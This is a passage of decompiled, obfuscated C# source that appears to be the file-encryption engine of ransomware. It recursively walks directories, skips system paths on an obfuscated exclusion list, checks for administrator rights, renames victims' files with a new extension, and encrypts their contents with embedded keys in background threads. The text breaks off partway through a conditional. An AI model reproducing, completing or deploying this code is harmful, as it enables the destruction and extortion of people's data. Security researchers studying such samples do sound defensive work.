using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using XDfkvgdjgIic;
using wNYxiQoDKrRkKV;

namespace drXPuaQNZPOSPCS;

internal sealed class OBRXLDkWsVk
{
	public sealed class zuVXgmocmxRQpz
	{
		private static StringCollection soxljQcffxOOxc;

		private static List<string> LLBVPNCqJrgLHb;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107403729));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107403724)) && !text.ToLower().Contains(getString_0(107403671)) && !text.ToLower().Contains(getString_0(107389200)) && !text.ToLower().Contains(getString_0(107389155)) && !text.ToLower().Contains(getString_0(107403690)) && !text.ToLower().Contains(getString_0(107389551)) && !text.ToLower().Contains(getString_0(107389492)) && !text.ToLower().Contains(getString_0(107389443)) && !text.ToLower().Contains(getString_0(107389458)) && !text.ToLower().Contains(getString_0(107389409)) && !text.ToLower().Contains(getString_0(107389375)) && !text.ToLower().Contains(getString_0(107389390)) && !text.ToLower().Contains(getString_0(107389341)) && !text.ToLower().Contains(getString_0(107389360)) && !text.ToLower().Contains(getString_0(107389307)) && !text.ToLower().Contains(getString_0(107389326)) && !text.ToLower().Contains(getString_0(107388769)) && !text.ToLower().Contains(getString_0(107388784)) && !text.ToLower().Contains(getString_0(107388735)) && !text.Contains(SptLhhxIveIbH(getString_0(107388750))) && !text.Contains(getString_0(107388725)) && !text.Contains(getString_0(107388712)) && !text.EndsWith(getString_0(107395276)) && !text.EndsWith(getString_0(107388687)) && !text.EndsWith(getString_0(107388682)) && !text.EndsWith(getString_0(107388645)) && !text.EndsWith(getString_0(107388640)) && !text.ToLower().Contains(getString_0(107388635)) && !text.ToLower().Contains(UYUhiRtWDRA))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(LvIpIlmDpOjD) * 1024.0 * 1024.0 && LKrPsTiarBz == getString_0(107396891))
							{
								LLBVPNCqJrgLHb.Add(text);
							}
							else if (File.Exists(text) && LKrPsTiarBz == getString_0(107397001))
							{
								LLBVPNCqJrgLHb.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return LLBVPNCqJrgLHb;
		}

		static zuVXgmocmxRQpz()
		{
			Strings.CreateGetStringDelegate(typeof(zuVXgmocmxRQpz));
			soxljQcffxOOxc = new StringCollection();
			LLBVPNCqJrgLHb = new List<string>();
		}
	}

	private sealed class IPGLRUcjsYXW
	{
		public string CYMAvaykPxqnn;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == CYMAvaykPxqnn;
		}
	}

	private sealed class wbutYhDBNwd
	{
		public string gYrcodCGJUaC;

		public bool _003CIsDriveNTFS_003Eb__17(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == gYrcodCGJUaC;
		}
	}

	private sealed class nICmWAPCmkfUon
	{
		private sealed class VFHbqLpZujduPC
		{
			public nICmWAPCmkfUon cJrMFxNNPVFbmF;

			public string yZkMFVxJlKap;

			public void _003CCrypt_003Eb__23()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					BsCWhZGHFFkwCr(WindowsIdentity.GetCurrent().Name, yZkMFVxJlKap);
				}
			}

			public void _003CCrypt_003Eb__24()
			{
				UNfNXKufiWJeIr(yZkMFVxJlKap, cJrMFxNNPVFbmF.IKZYnWviuZRD, cJrMFxNNPVFbmF.qIZRNqGfcrWcgcu, cJrMFxNNPVFbmF.cLeqiDJOkuMpOV, cJrMFxNNPVFbmF.UDmcHcdniryqge);
			}
		}

		public string[] IKZYnWviuZRD;

		public string[] cLeqiDJOkuMpOV;

		public string UDmcHcdniryqge;

		public string qIZRNqGfcrWcgcu;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__22(string string_0)
		{
			VFHbqLpZujduPC CS_0024_003C_003E8__locals0 = new VFHbqLpZujduPC();
			CS_0024_003C_003E8__locals0.cJrMFxNNPVFbmF = this;
			CS_0024_003C_003E8__locals0.yZkMFVxJlKap = string_0;
			if (grcSOEZMQSYrI && !zHhLTmoiTGS().Contains(getString_0(107387377)) && !zHhLTmoiTGS().Contains(getString_0(107403648)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						BsCWhZGHFFkwCr(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.yZkMFVxJlKap);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (nmBOMxoUYyM == getString_0(107396898))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					UNfNXKufiWJeIr(CS_0024_003C_003E8__locals0.yZkMFVxJlKap, CS_0024_003C_003E8__locals0.cJrMFxNNPVFbmF.IKZYnWviuZRD, CS_0024_003C_003E8__locals0.cJrMFxNNPVFbmF.qIZRNqGfcrWcgcu, CS_0024_003C_003E8__locals0.cJrMFxNNPVFbmF.cLeqiDJOkuMpOV, CS_0024_003C_003E8__locals0.cJrMFxNNPVFbmF.UDmcHcdniryqge);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				UNfNXKufiWJeIr(CS_0024_003C_003E8__locals0.yZkMFVxJlKap, IKZYnWviuZRD, qIZRNqGfcrWcgcu, cLeqiDJOkuMpOV, UDmcHcdniryqge);
			}
		}

		static nICmWAPCmkfUon()
		{
			Strings.CreateGetStringDelegate(typeof(nICmWAPCmkfUon));
		}
	}

	private sealed class uNiEyIpSZVz
	{
		private sealed class iMsmThAMeQ
		{
			public uNiEyIpSZVz WzuXuFEQNWZh;

			public string dxgicsPAINTY;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__33()
			{
				try
				{
					if (vnHLNKxzZjB)
					{
						Console.WriteLine(getString_0(107403192) + dxgicsPAINTY + getString_0(107403089) + new FileInfo(dxgicsPAINTY).Length + getString_0(107403100));
						Console.WriteLine(getString_0(107403199), rhZfJiziUVZGmK.Count, bTxbPbZzsh, hRbHTMLNoeoN);
						Console.WriteLine(getString_0(107402630), AxBdgXHxeQeZJ.Elapsed);
						Console.WriteLine(getString_0(107403059));
					}
				}
				catch
				{
				}
			}

			static iMsmThAMeQ()
			{
				Strings.CreateGetStringDelegate(typeof(iMsmThAMeQ));
			}
		}

		private sealed class OexHNbhRQqQ
		{
			public iMsmThAMeQ JAfHokiOmoEMX;

			public uNiEyIpSZVz WzuXuFEQNWZh;

			public string jxlBzzkVmZwV;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__34()
			{
				foreach (string item in fWsOOFrdViRF)
				{
					if (jxlBzzkVmZwV.ToLower().EndsWith(item + WzuXuFEQNWZh.FuYKgKQHbtN) && bXfvZIqjNkLdMvI == getString_0(107396913))
					{
						if (Convert.ToInt32(CkwHjikrCvdOm) * 1024 * 1024 > new FileInfo(jxlBzzkVmZwV).Length)
						{
							try
							{
								CymodjHxdipp.RDxamUeGvIod(getString_0(107389834), getString_0(107389829), getString_0(107389784), jxlBzzkVmZwV);
							}
							catch
							{
							}
						}
					}
					else if (jxlBzzkVmZwV.ToLower().EndsWith(item) && bXfvZIqjNkLdMvI == getString_0(107397023))
					{
						try
						{
							CymodjHxdipp.RDxamUeGvIod(getString_0(107389834), getString_0(107389829), getString_0(107389784), jxlBzzkVmZwV);
						}
						catch
						{
						}
					}
				}
			}

			static OexHNbhRQqQ()
			{
				Strings.CreateGetStringDelegate(typeof(OexHNbhRQqQ));
			}
		}

		private sealed class XqXXZafSRwIHeXM
		{
			public uNiEyIpSZVz WzuXuFEQNWZh;

			public string dxgicsPAINTY;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__36()
			{
				try
				{
					if (vnHLNKxzZjB)
					{
						Console.WriteLine(getString_0(107403199) + dxgicsPAINTY + getString_0(107403096) + new FileInfo(dxgicsPAINTY).Length + getString_0(107403107));
						Console.WriteLine(getString_0(107403206), rhZfJiziUVZGmK.Count, bTxbPbZzsh, hRbHTMLNoeoN);
						Console.WriteLine(getString_0(107402637), AxBdgXHxeQeZJ.Elapsed);
						Console.WriteLine(getString_0(107403066));
					}
				}
				catch
				{
				}
			}

			public void _003CWorkerCrypter2_003Eb__37()
			{
				foreach (string item in fWsOOFrdViRF)
				{
					if (dxgicsPAINTY.ToLower().EndsWith(item + WzuXuFEQNWZh.FuYKgKQHbtN) && bXfvZIqjNkLdMvI == getString_0(107396916))
					{
						if (Convert.ToInt32(CkwHjikrCvdOm) * 1024 * 1024 > new FileInfo(dxgicsPAINTY).Length)
						{
							try
							{
								CymodjHxdipp.RDxamUeGvIod(getString_0(107389837), getString_0(107389832), getString_0(107389787), dxgicsPAINTY);
							}
							catch
							{
							}
						}
					}
					else if (dxgicsPAINTY.ToLower().EndsWith(item) && bXfvZIqjNkLdMvI == getString_0(107397026))
					{
						try
						{
							CymodjHxdipp.RDxamUeGvIod(getString_0(107389837), getString_0(107389832), getString_0(107389787), dxgicsPAINTY);
						}
						catch
						{
						}
					}
				}
			}

			static XqXXZafSRwIHeXM()
			{
				Strings.CreateGetStringDelegate(typeof(XqXXZafSRwIHeXM));
			}
		}

		public List<string> sHhqMfTvkRbOg;

		public List<string> VpbroTtOOIHkJa;

		public string FuYKgKQHbtN;

		public string[] IATEnfqjKRGd;

		public string yIgCFYujnVKnghS;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__32(string string_0)
		{
			using List<string>.Enumerator enumerator = VpbroTtOOIHkJa.GetEnumerator();
			OexHNbhRQqQ CS_0024_003C_003E8__locals0;
			while (enumerator.MoveNext())
			{
				iMsmThAMeQ CS_0024_003C_003E8__locals1 = new iMsmThAMeQ();
				CS_0024_003C_003E8__locals1.WzuXuFEQNWZh = this;
				CS_0024_003C_003E8__locals1.dxgicsPAINTY = enumerator.Current;
				if (CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107389258)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107389233)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107389200)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(getString_0(107389215)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(getString_0(107389170)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107389177)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107389156)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(getString_0(107389143)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(getString_0(107389098)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(getString_0(107389093)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(getString_0(107389084)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(getString_0(107389547)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(getString_0(107389521)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(getString_0(107389532)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107389507)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107389458)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107389473)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107389424)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107389439)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107389390)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107389405)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107389356)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107389375)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107389322)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(getString_0(107389341)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(getString_0(107388784)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(getString_0(107388799)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.ToLower().Contains(getString_0(107388750)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(SptLhhxIveIbH(getString_0(107388765))) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107388740)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107397156)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107388727)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.EndsWith(FuYKgKQHbtN) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.EndsWith(getString_0(107388702)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.EndsWith(getString_0(107388697)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.EndsWith(getString_0(107388660)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.EndsWith(getString_0(107388655)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(getString_0(107388650)) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(UYUhiRtWDRA) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(LtQdcjdFVaR) || CS_0024_003C_003E8__locals1.dxgicsPAINTY.Contains(UJdCCmcOabmXjhMvpZ))
				{
					continue;
				}
				if (IATEnfqjKRGd.Length != 0)
				{
					string[] iATEnfqjKRGd = IATEnfqjKRGd;
					int num = 0;
					while (num < iATEnfqjKRGd.Length)
					{
						string value = iATEnfqjKRGd[num];
						if (!CS_0024_003C_003E8__locals1.dxgicsPAINTY.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_10b1;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals1.dxgicsPAINTY.EndsWith(FuYKgKQHbtN))
					{
						goto IL_10b1;
					}
				}
				catch (Exception)
				{
					goto IL_10b1;
				}
				if (!CS_0024_003C_003E8__locals1.dxgicsPAINTY.EndsWith(string_0) || rhZfJiziUVZGmK.Contains(CS_0024_003C_003E8__locals1.dxgicsPAINTY))
				{
					continue;
				}
				if (NTUVpfCRDqR == getString_0(107396906))
				{
					try
					{
						if (FTTifYaMdeudV.DQVZdjxliaL(CS_0024_003C_003E8__locals1.dxgicsPAINTY))
						{
							FTTifYaMdeudV.lsApOpcnkf(CS_0024_003C_003E8__locals1.dxgicsPAINTY);
						}
					}
					catch
					{
					}
				}
				rhZfJiziUVZGmK.Add(CS_0024_003C_003E8__locals1.dxgicsPAINTY);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (vnHLNKxzZjB)
						{
							Console.WriteLine(iMsmThAMeQ.getString_0(107403192) + CS_0024_003C_003E8__locals1.dxgicsPAINTY + iMsmThAMeQ.getString_0(107403089) + new FileInfo(CS_0024_003C_003E8__locals1.dxgicsPAINTY).Length + iMsmThAMeQ.getString_0(107403100));
							Console.WriteLine(iMsmThAMeQ.getString_0(107403199), rhZfJiziUVZGmK.Count, bTxbPbZzsh, hRbHTMLNoeoN);
							Console.WriteLine(iMsmThAMeQ.getString_0(107402630), AxBdgXHxeQeZJ.Elapsed);
							Console.WriteLine(iMsmThAMeQ.getString_0(107403059));
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!LcgkciImoRwcI.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.dxgicsPAINTY)))
				{
					LcgkciImoRwcI.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.dxgicsPAINTY));
				}
				UyKwBXYiIu(CS_0024_003C_003E8__locals1.dxgicsPAINTY);
				try
				{
					new yQFjeolKXMd().noDvZcrtQzqfZg(CS_0024_003C_003E8__locals1.dxgicsPAINTY);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals1.dxgicsPAINTY, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (vnHLNKxzZjB)
							{
								Console.WriteLine(getString_0(107403675) + CS_0024_003C_003E8__locals1.dxgicsPAINTY + getString_0(107403086) + new FileInfo(CS_0024_003C_003E8__locals1.dxgicsPAINTY).Length + getString_0(107403097));
								Console.WriteLine(getString_0(107403056));
							}
						}
						catch
						{
						}
						katTjVhRXIw(SptLhhxIveIbH(getString_0(107402951)), getString_0(107388598) + CS_0024_003C_003E8__locals1.dxgicsPAINTY + getString_0(107388598) + SptLhhxIveIbH(getString_0(107402926)) + getString_0(107388598) + Environment.UserName + getString_0(107388598) + SptLhhxIveIbH(getString_0(107402941)));
					}
				}
				catch (Exception ex2)
				{
					if (ZQkgwClpBNRNGiD)
					{
						try
						{
							File.AppendAllText(LtQdcjdFVaR, getString_0(107387519) + CS_0024_003C_003E8__locals1.dxgicsPAINTY + getString_0(107402916) + ex2.Message + getString_0(107396624));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals1.dxgicsPAINTY).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (ZQkgwClpBNRNGiD)
						{
							try
							{
								File.AppendAllText(LtQdcjdFVaR, getString_0(107387519) + CS_0024_003C_003E8__locals1.dxgicsPAINTY + getString_0(107403315) + ex4.Message + getString_0(107396624));
							}
							catch (Exception)
							{
							}
						}
						hRbHTMLNoeoN++;
						goto end_IL_08ba;
					}
					if (GVzkeDFkkNt == getString_0(107396906) && new FileInfo(CS_0024_003C_003E8__locals1.dxgicsPAINTY).Length > Convert.ToInt32(JRjvEgYWmxeX) * 1024 * 1024 && !sHhqMfTvkRbOg.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new OexHNbhRQqQ();
						CS_0024_003C_003E8__locals0.JAfHokiOmoEMX = CS_0024_003C_003E8__locals1;
						CS_0024_003C_003E8__locals0.WzuXuFEQNWZh = this;
						try
						{
							if (FuYKgKQHbtN != getString_0(107386728))
							{
								if (IrAGOpnAWTw)
								{
									FuYKgKQHbtN = QgOBOurkDz + FuYKgKQHbtN;
								}
								File.Move(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY + FuYKgKQHbtN);
							}
						}
						catch (Exception ex6)
						{
							if (ZQkgwClpBNRNGiD)
							{
								try
								{
									File.AppendAllText(LtQdcjdFVaR, getString_0(107387519) + CS_0024_003C_003E8__locals1.dxgicsPAINTY + getString_0(107403286) + ex6.Message + getString_0(107396624));
								}
								catch (Exception)
								{
								}
							}
							hRbHTMLNoeoN++;
							goto end_IL_08ba;
						}
						CS_0024_003C_003E8__locals0.jxlBzzkVmZwV = getString_0(107389714);
						if (FuYKgKQHbtN != getString_0(107386728))
						{
							CS_0024_003C_003E8__locals0.jxlBzzkVmZwV = CS_0024_003C_003E8__locals1.dxgicsPAINTY + FuYKgKQHbtN;
						}
						else
						{
							CS_0024_003C_003E8__locals0.jxlBzzkVmZwV = CS_0024_003C_003E8__locals1.dxgicsPAINTY;
						}
						if (sKNvVrMLVliweTD == getString_0(107396906))
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item in fWsOOFrdViRF)
								{
									if (CS_0024_003C_003E8__locals0.jxlBzzkVmZwV.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.WzuXuFEQNWZh.FuYKgKQHbtN) && bXfvZIqjNkLdMvI == OexHNbhRQqQ.getString_0(107396913))
									{
										if (Convert.ToInt32(CkwHjikrCvdOm) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.jxlBzzkVmZwV).Length)
										{
											try
											{
												CymodjHxdipp.RDxamUeGvIod(OexHNbhRQqQ.getString_0(107389834), OexHNbhRQqQ.getString_0(107389829), OexHNbhRQqQ.getString_0(107389784), CS_0024_003C_003E8__locals0.jxlBzzkVmZwV);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.jxlBzzkVmZwV.ToLower().EndsWith(item) && bXfvZIqjNkLdMvI == OexHNbhRQqQ.getString_0(107397023))
									{
										try
										{
											CymodjHxdipp.RDxamUeGvIod(OexHNbhRQqQ.getString_0(107389834), OexHNbhRQqQ.getString_0(107389829), OexHNbhRQqQ.getString_0(107389784), CS_0024_003C_003E8__locals0.jxlBzzkVmZwV);
										}
										catch
										{
										}
									}
								}
							});
							thread2.Priority = ThreadPriority.Normal;
							thread2.IsBackground = false;
							thread2.Start();
						}
						byte[] bytes = Encoding.ASCII.GetBytes(jlwdVcCVDXv);
						if (uuDJEvtSXmqQR == getString_0(107397016))
						{
							byte[] array = null;
							byte[] byte_ = qsVBtPrJSv.onZydZdaURpY(CS_0024_003C_003E8__locals0.jxlBzzkVmZwV, Convert.ToInt32(JRjvEgYWmxeX) * 1024 * 1024);
							if (qsVBtPrJSv.lvDlvibtIHl(uqGgpaIFQqSRvN: (!pfmrZzuzgFVdg) ? (yzxmjEHglZqnOW ? qsVBtPrJSv.KiYWDoMxnom(byte_, Convert.FromBase64String(yIgCFYujnVKnghS), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : qsVBtPrJSv.KiYWDoMxnom(byte_, Convert.FromBase64String(yIgCFYujnVKnghS), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (yzxmjEHglZqnOW ? ZJPCkUensbMQ.azaPAsjkpkAz(byte_, Convert.FromBase64String(yIgCFYujnVKnghS), Convert.FromBase64String(orecqussiUlGJkD)) : ZJPCkUensbMQ.azaPAsjkpkAz(byte_, Convert.FromBase64String(yIgCFYujnVKnghS), Convert.FromBase64String(orecqussiUlGJkD))), HnqoYCdHvfu: CS_0024_003C_003E8__locals0.jxlBzzkVmZwV, yLndxBtngveE: bytes))
							{
								goto IL_10b1;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.dxgicsPAINTY + FuYKgKQHbtN, CS_0024_003C_003E8__locals1.dxgicsPAINTY);
							}
							catch (Exception)
							{
							}
						}
						else if (!yzxmjEHglZqnOW)
						{
							if (zQrrdfdyTPbGA.opNZPDFPzEYow(CS_0024_003C_003E8__locals0.jxlBzzkVmZwV, JRjvEgYWmxeX, yIgCFYujnVKnghS, null, Convert.FromBase64String(orecqussiUlGJkD)))
							{
								goto IL_10b1;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.dxgicsPAINTY + FuYKgKQHbtN, CS_0024_003C_003E8__locals1.dxgicsPAINTY);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (zQrrdfdyTPbGA.opNZPDFPzEYow(CS_0024_003C_003E8__locals0.jxlBzzkVmZwV, JRjvEgYWmxeX, yIgCFYujnVKnghS, bytes, Convert.FromBase64String(orecqussiUlGJkD)))
							{
								goto IL_10b1;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.dxgicsPAINTY + FuYKgKQHbtN, CS_0024_003C_003E8__locals1.dxgicsPAINTY);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (IrAGOpnAWTw)
					{
						FuYKgKQHbtN = QgOBOurkDz + FuYKgKQHbtN;
					}
					byte[] bytes2 = Encoding.ASCII.GetBytes(jlwdVcCVDXv);
					if (FuYKgKQHbtN != getString_0(107386728))
					{
						if (!hQdOFpLMvqT)
						{
							if (!yzxmjEHglZqnOW)
							{
								bjDjiXZhvR(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY + FuYKgKQHbtN, RpFQaGTQWAGLZ);
							}
							else
							{
								bjDjiXZhvR(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY + FuYKgKQHbtN, Convert.FromBase64String(yIgCFYujnVKnghS));
							}
						}
						else
						{
							try
							{
								if (!yzxmjEHglZqnOW)
								{
									djVxzdXCmcblm(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY + FuYKgKQHbtN, RpFQaGTQWAGLZ, Convert.FromBase64String(orecqussiUlGJkD));
								}
								else
								{
									djVxzdXCmcblm(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY + FuYKgKQHbtN, Convert.FromBase64String(yIgCFYujnVKnghS), Convert.FromBase64String(orecqussiUlGJkD));
								}
							}
							catch (Exception ex11)
							{
								if (ZQkgwClpBNRNGiD)
								{
									try
									{
										File.AppendAllText(LtQdcjdFVaR, getString_0(107387519) + CS_0024_003C_003E8__locals1.dxgicsPAINTY + getString_0(107386746) + ex11.Message + getString_0(107396624));
									}
									catch (Exception)
									{
									}
								}
								hRbHTMLNoeoN++;
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.dxgicsPAINTY + FuYKgKQHbtN, CS_0024_003C_003E8__locals1.dxgicsPAINTY);
								}
								catch (Exception)
								{
								}
								goto end_IL_08ba;
							}
						}
					}
					else if (!hQdOFpLMvqT)
					{
						if (!yzxmjEHglZqnOW)
						{
							bjDjiXZhvR(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY + getString_0(107386755), RpFQaGTQWAGLZ);
						}
						else
						{
							bjDjiXZhvR(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY + getString_0(107386755), Convert.FromBase64String(yIgCFYujnVKnghS));
						}
					}
					else
					{
						try
						{
							if (!yzxmjEHglZqnOW)
							{
								djVxzdXCmcblm(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY, RpFQaGTQWAGLZ, Convert.FromBase64String(orecqussiUlGJkD));
							}
							else
							{
								djVxzdXCmcblm(CS_0024_003C_003E8__locals1.dxgicsPAINTY, CS_0024_003C_003E8__locals1.dxgicsPAINTY, Convert.FromBase64String(yIgCFYujnVKnghS), Convert.FromBase64String(orecqussiUlGJkD));
							}
						}
						catch (Exception ex14)
						{
							if (ZQkgwClpBNRNGiD)
							{
								try
								{
									File.AppendAllText(LtQdcjdFVaR, getString_0(107387519) + CS_0024_003C_003E8__locals1.dxgicsPAINTY + getString_0(107386746) + ex14.Message + getString_0(107396624));
								}
								catch (Exception)
								{
								}
							}
							hRbHTMLNoeoN++;
							goto end_IL_08ba;
						}
					}
					if (yzxmjEHglZqnOW)
					{
						if (FuYKgKQHbtN != getString_0(107386728))
						{
							OGgWAVXoBCZ(CS_0024_003C_003E8__locals1.dxgicsPAINTY + FuYKgKQHbtN, bytes2);
						}
						else
						{
							OGgWAVXoBCZ(CS_0024_003C_003E8__locals1.dxgicsPAINTY, bytes2);
						}
					}
					goto IL_10b1;
					end_IL_08ba:;
				}
				catch (Exception)
				{
					goto IL_10b1;
				}
				continue;
				IL_10b1:
				VpbroTtOOIHkJa.Remove(CS_0024_003C_003E8__locals1.dxgicsPAINTY);
			}
		}

		public void _003CWorkerCrypter2_003Eb__35(string string_0)
		{
			XqXXZafSRwIHeXM CS_0024_003C_003E8__locals0 = new XqXXZafSRwIHeXM();
			CS_0024_003C_003E8__locals0.WzuXuFEQNWZh = this;
			CS_0024_003C_003E8__locals0.dxgicsPAINTY = string_0;
			if (!CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107389258)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107389233)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107389200)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(getString_0(107389215)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(getString_0(107389170)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107389177)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.Contains(getString_0(107389156)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(getString_0(107389143)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(getString_0(107389098)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(getString_0(107389093)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(getString_0(107389084)) && !CS_0024_003C_003E8__locals0.dxgicsPAINTY.ToLower().Contains(getString_0(107389547)) && 